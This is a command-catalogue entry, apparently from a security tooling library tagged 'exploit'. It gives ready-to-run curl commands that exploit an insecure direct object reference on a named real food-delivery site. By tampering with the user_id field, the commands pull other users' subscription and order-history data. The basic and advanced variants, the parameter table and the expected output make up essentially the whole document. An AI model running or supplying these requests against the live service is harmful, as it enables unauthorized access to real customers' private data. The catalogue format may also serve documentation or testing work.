---
id: cmd-uuid-1
data: >-
  curl -X POST 'https://www.zomato.com/php/filter_user_tab_content.php' -H
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' -H
  'Accept: */*' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie:
  PHPSESSID=your_session_cookie; other_cookies' -H 'X-CSRF-Token:
  your_csrf_token' -d
  'user_id=4&tab=treat_subscription&order_history_offset=0&order_history_limit=20'
tags:
  - web
  - api
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.613Z'
verified: false
validated: true
submitted: true
---
# curl-idor-post-request

## Command

```bash
curl -X POST 'https://www.zomato.com/php/filter_user_tab_content.php' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: PHPSESSID=your_session_cookie; other_cookies' \
  -H 'X-CSRF-Token: your_csrf_token' \
  -d 'user_id=4&tab=treat_subscription&order_history_offset=0&order_history_limit=20'
```

## Description

This curl command sends a modified POST request to exploit the IDOR vulnerability in Zomato's API by setting an arbitrary user_id, using an authenticated session to retrieve unauthorized subscription data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H 'User-Agent: ...'` | Mimics browser user agent | Yes |
| `-H 'Accept: */*'` | Accepts any response type | Yes |
| `-H 'Content-Type: ...'` | Sets form-encoded body | Yes |
| `-H 'Cookie: ...'` | Includes session and CSRF | Yes |
| `-H 'X-CSRF-Token: ...'` | Anti-CSRF protection | Yes (if required) |
| `-d 'user_id=4&...'` | POST data with tampered user_id | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.zomato.com/php/filter_user_tab_content.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'user_id=4&tab=treat_subscription'
```

### Advanced Usage

```bash
curl -X POST 'https://www.zomato.com/php/filter_user_tab_content.php' -H 'Cookie: PHPSESSID=abc123' -d 'user_id=4&tab=treat_subscription&order_history_offset=0&order_history_limit=20' -o response.json
```

## Expected Output

JSON response with subscription details, e.g., {"data": {"subscriptions": [{"subscription_id": 123, "purchased_date": "2023-01-01", "validity": "1 year"}]}} if successful; error if authorized properly.

## Related

- [[Related Procedure: Modify-API-Request-for-IDOR-Exploitation]]
